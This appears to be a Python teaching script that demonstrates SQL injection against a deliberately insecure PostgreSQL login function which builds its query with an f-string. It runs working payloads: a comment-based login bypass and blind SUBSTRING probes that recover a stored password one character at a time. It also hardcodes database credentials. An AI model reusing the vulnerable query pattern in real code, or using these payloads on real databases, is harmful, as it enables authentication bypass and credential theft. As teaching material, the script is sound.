import psycopg
from psycopg.rows import dict_row


def dangerous_get_user(username: str, password: str):
    unsafe_query = f"SELECT username, email FROM users WHERE username = '{username}' AND password = '{password}';"
    with psycopg.connect(
        host='localhost',
        port=5432,
        dbname='postgres',
        user='postgres',
        password='pg_secret',
        row_factory=dict_row,
    ) as conn:
        with conn.cursor() as cur:
            cur.execute(unsafe_query)
            return cur.fetchall()


username = 'ebarakoji'
password = 'aH8)m"2TH(y'
results = dangerous_get_user(username, password)
print(results)  # get user using right password

toxic_username = "ebarakoji' -- "
results = dangerous_get_user(toxic_username, '')
print(results)  # XXX: get user WITHOUT password, but cannot see password.

toxic_username = "ebarakoji' AND SUBSTRING((SELECT password FROM users WHERE username = 'ebarakoji'), 1, 1) = 'A'--"
results = dangerous_get_user(toxic_username, '')
print(results)  # returns no user, so first character of password isn't 'A'!

toxic_username = "ebarakoji' AND SUBSTRING((SELECT password FROM users WHERE username = 'ebarakoji'), 1, 1) = 'a'--"
results = dangerous_get_user(toxic_username, '')
print(results)  # returns user, so first character is 'a'!

toxic_username = "ebarakoji' AND SUBSTRING((SELECT password FROM users WHERE username = 'ebarakoji'), 1, 1) > 't'--"
results = dangerous_get_user(toxic_username, '')
print(results)  # returns no user, so first character is lesser than 't'!
